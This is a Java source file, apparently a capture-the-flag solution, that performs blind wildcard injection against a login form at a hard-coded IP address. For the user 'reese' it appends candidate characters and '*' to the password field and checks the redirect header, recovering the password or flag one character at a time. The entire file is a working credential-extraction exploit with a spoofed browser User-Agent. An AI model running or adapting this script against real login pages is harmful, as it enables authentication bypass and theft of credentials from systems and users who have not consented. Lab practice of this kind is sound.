import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class phonobokk {

    static final String TARGET_URL = "http://138.68.129.26:32380/login";

    public static void main(String[] args) {

        String currentPass = "";

        HttpClient client = HttpClient.newBuilder().build();

        for (int j = 0; j < 30; j++) {
            System.out.println("find " + (j + 1) + " symbol");
            System.out.print("Current symbol: ");

            for (int i = 48; i < 128; i++) {
                System.out.print((char)i);
                String newPass = currentPass + (char) i;
                String requestBody = "username=reese&password=" + newPass + "*";

                HttpRequest postRequest = HttpRequest.newBuilder()
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0")
                        .uri(URI.create(TARGET_URL))
                        .POST(HttpRequest.BodyPublishers.ofString(requestBody))
                        .build();

                HttpResponse<String> response = null;

                try {
                    response = client.send(postRequest, HttpResponse.BodyHandlers.ofString());
                } catch (Exception e) {
                    System.out.println("Wrong response " + e);
                }

                assert response != null;
                String result = response.headers().toString();
                if (result.contains("location=[/]")) {
                    System.out.println(" found!");
                    System.out.println(newPass);
                    currentPass = newPass;
                    break;
                }
            }
            if (currentPass.charAt(currentPass.length() - 1) == '}')  {
                break;
            }
        }
    }
}


